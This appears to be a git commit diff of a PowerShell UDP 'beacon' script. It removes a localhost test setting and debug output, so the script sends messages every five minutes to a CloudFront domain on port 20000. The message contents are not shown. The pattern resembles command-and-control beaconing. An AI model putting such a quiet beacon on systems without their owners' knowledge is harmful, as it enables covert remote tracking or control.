baa01d38f31814c54379a41780a0063262a46322
Will Perry <wfperry1@gmail.com>
2022-06-11 13:06:59 -0400

    Removes testing configurations.

--- beacon/UDPBeacon.ps1
+++ beacon/UDPBeacon.ps1
@@ -1,7 +1,6 @@
 [int] $Port = 20000 
 $server = "d111111abcdef8.cloudfront.net" 
-$realip = [System.Net.Dns]::GetHostAddresses($server)[0] 
-$ip = "127.0.0.1"
+$ip = [System.Net.Dns]::GetHostAddresses($server)[0] 
 $Address = [system.net.IPAddress]::Parse($ip) 
 $End = New-Object System.Net.IPEndPoint $address, $port 
 $Saddrf   = [System.Net.Sockets.AddressFamily]::InterNetwork 
@@ -16,12 +15,6 @@ while ($true) {
 
     foreach ($m in $Message) {
         $Buffer  = $Enc.GetBytes([string]$m);
-
-        # Send the buffer 
-        Write-Host($m)
-        Write-Host($Buffer)
-        Write-Host($End)
-        Write-Host($realip)
         $Sock.SendTo($Buffer, $End) 
     }
     Start-Sleep 300
